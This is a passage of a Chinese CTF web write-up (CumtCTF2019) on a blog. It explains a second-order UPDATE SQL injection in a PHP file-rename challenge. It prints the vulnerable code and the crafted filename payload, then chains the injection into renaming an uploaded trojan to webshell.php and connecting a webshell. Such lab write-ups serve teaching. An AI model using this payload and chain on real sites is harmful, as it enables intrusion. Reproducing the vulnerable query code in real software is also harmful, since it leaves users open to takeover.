           <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.问题主要出现在rename.php里，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//因为filename是经过转义后存入数据库的，这里是正常执行sql语句</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">errorInfo</span>());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$oldname</span> = ROOT.UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>].<span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="variable">$newname</span> = ROOT.UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>].<span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="variable">$oldname</span>.<span class="string">&quot; not exists.&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第一个<code>select</code>语句显示根据 <code>$req[&#39;filename&#39;]</code> 从数据库里查询到已存在的一行，再用第二个<code>update</code>语句进行修改，这里的<code>&#39;oldname&#39;=&#39;&#123;$result[&#39;filename&#39;]&#125;&#39;</code>将从数据库里查出的<code>$result[&#39;filename&#39;]</code>再一次入库，因此存在二次注入。</p>
+<p>4、观察发现<code>oldname</code>和<code>newname</code>，有几个特点：</p>
+<ul>
+<li>后缀相同，都是<code>$result[‘extension’]</code></li>
+<li><code>oldname</code>的文件名来自数据库，<code>newname</code>的文件名来自用户输入</li>
+</ul>
+<p>虽然代码要求<code>oldname</code>和<code>newname</code>要求后缀相同，可以通过<strong>update型注入</strong>将<code>extension</code>改为空，同时可修改<code>filename</code>的值。<br>因此<strong>构造</strong>的<strong>文件名payload</strong>为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code> </p>
+<p>5、上传文件名为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code>的文件后，根据upload.php知:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$path_parts[&quot;extension&quot;] = &quot;.jpg&quot;</span><br><span class="line">$path_parts[&#x27;filename&#x27;] = &quot;&#x27;,extension=&#x27;&#x27;,filename=&#x27;webshell.jpg&quot;</span><br><span class="line">插入数据库后，此时数据库里：</span><br><span class="line">filename字段的值为经过addslashes()转义的&#x27;,extension=&#x27;&#x27;,filename=&#x27;webshell.jpg</span><br><span class="line">extension字段的值为.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190303110502291.png" alt="在这里插入图片描述"></p>
+<p>6、下来才是真正的<strong>updata注入过程</strong></p>
+<p>进入到rename.php页面，进行如下操作，将文件名修改为由<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg</code>修改为<code>webshell.jpg</code>（这里rename页面输入的文件名均是要求不含后缀的，在数据库里文件名和后缀是分两个字段进行存储的）<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190303110649872.png" alt="在这里插入图片描述"><br>上述操作改名后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$req[&#x27;oldname&#x27;] = &quot;&#x27;,extension=&#x27;&#x27;,filename=&#x27;webshell.jpg&quot;</span><br><span class="line">$req[&#x27;newname&#x27;] = &quot;webshell.jpg&quot;</span><br></pre></td></tr></table></figure>
+<p>接下来执行：<code>select * from &#39;file&#39; where &#39;filename&#39;=&#39;&#123;$req[&#39;oldname&#39;]&#125;&#39;</code><br>因为<code>filename</code>在上传后经过<code>addslashes()</code>转义的，所以此条语句正常执行</p>
+<p>但是在执行下条语句，也就是：</p>
+<pre><code>update &#39;file&#39; set &#39;filename&#39;=&#39;&#123;$req[&#39;newname&#39;]&#125;&#39;, &#39;oldname&#39;=&#39;&#123;$result[&#39;filename&#39;]&#125;&#39; where &#39;fid&#39;=&#123;$result[&#39;fid&#39;]&#125;
+</code></pre>
+<p>出现了注入，将构造的文件名插入这条语句得到实际执行的sql语句:</p>
+<pre><code> update &#39;file&#39; set &#39;filename&#39;=&#39;webshell.jpg&#39;, &#39;oldname&#39;=&#39;&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg&#39; where &#39;fid&#39;=&#123;$result[&#39;fid&#39;]&#125;
+</code></pre>
+<p>可以发现通过updata语句，修改了数据中的字段值，此时<strong>数据库</strong>中各字段：</p>
+<pre><code>filename = webshell.jpg
+oldname = 空
+extension =  空
+</code></pre>
+<p>这样思路就很清楚了：</p>
+<ul>
+<li>虽然<strong>数据库</strong>中的<code>filename</code>通过注入改变了，但<strong>真实系统目录</strong>里的文件名为其实并没有变。<br>但是通过前面的注入，这条记录的<code>extension</code>值为空，因此只要能够调用<code>rename()</code>函数，就直接把输入的<code>filename</code>里的后缀当成文件后缀。</li>
+<li>执行<code>rename()</code>函数还有一个判断:<code>if(file_exists($oldname))</code>，但实际上我们系统目录并没有<code>webshell.jpg</code>这个文件，这样就需要再上传一个<code>webshell.jpg</code>文件。</li>
+</ul>
+<p>7、因此接下来就可以上传真正包含一句话木马的文件：<code>webshell.jpg</code>，上传后：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> $path_parts[&quot;extension&quot;] = &quot;.jpg&quot;</span><br><span class="line"> $path_parts[&#x27;filename&#x27;] = &quot;webshell&quot;</span><br><span class="line">并在数据库中插入了新的一条记录：</span><br><span class="line"> filename字段的值为经过addslashes()转义的webshell</span><br><span class="line"> extension字段的值为.jpg</span><br><span class="line"> 且系统目录下存在真实文件：webshell.jpg</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190303112153331.png" alt="在这里插入图片描述"><br>接下来再次进入rename.php页面进行改名，这也是很关键的一步：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/2019030311225052.png" alt="在这里插入图片描述"><br>将<code>webshell.jpg</code>改为<code>webshell.php</code>，这样操作后：</p>
+<p>因为注入后，数据库中存在<code>filename</code>为<code>webshell.jpg</code>的记录，因此可以绕过这条语句：</p>
+<pre><code>select * from &#39;file&#39; where &#39;filename&#39;=&#39;&#123;$req[&#39;oldname&#39;]&#125;&#39;
+</code></pre>
+<p>然后再次通过updata语句：</p>
+<pre><code>update &#39;file&#39; set &#39;filename&#39;=&#39;&#123;$req[&#39;newname&#39;]&#125;&#39;, &#39;oldname&#39;=&#39;&#123;$result[&#39;filename&#39;]&#125;&#39; where &#39;fid&#39;=&#123;$result[&#39;fid&#39;]&#125;
+</code></pre>
+<p>将<code>filename</code>的值从<code>webshell.jpg</code>修改为<code>webshell.php</code>，<code>oldname</code>修改为原来<code>filename</code>的值，其他不变，此时数据库中这条记录的字段值为：</p>
+<pre><code>filename = webshell.php
+oldname = webshell.jpg
+extension =  空
+</code></pre>
+<p>接下来，因为后缀extension为空，所以通过这两条语句赋值后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[&quot;filename&quot;].$result[&quot;extension&quot;];</span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[&quot;newname&quot;].$result[&quot;extension&quot;];</span><br></pre></td></tr></table></figure>
+<p> 实际上得到：</p>
+<pre><code>$oldname = webshell.php
+$newname = webshell.jpg
+</code></pre>
+<p>最后，在进行<code>if(file_exists($oldname))</code>判断时，因为第二次上传到目录的文件就是<code>webshell.jpg</code>，所以可以通过判断。<br>这样就可以执行<code>rename($oldname, $newname)</code>，将目录下的包含木马的文件<code>webshell.jpg</code>改名为<code>webshell.php</code>，也就成功上传了php木马到后台。</p>
+<p>8、既然已经成功上传了webshell，那么直接用菜刀链接，即可getshell，获得flag。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/2019030311515537.png" alt="在这里插入图片描述"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/03/03/CumtCTF2019-Web-Writeup/">https://lethe.site/2019/03/03/CumtCTF2019-Web-Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/03/07/BugkuCTF-Writeup-Web/">BugkuCTF_Web_Writeup</a>
+            
+            
+            <a class="next" rel="next" href="/2019/03/02/learn-boolean-blind-sqli-by-dvwa/">以dvwa为例学习简单sql布尔盲注的详细脚本</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
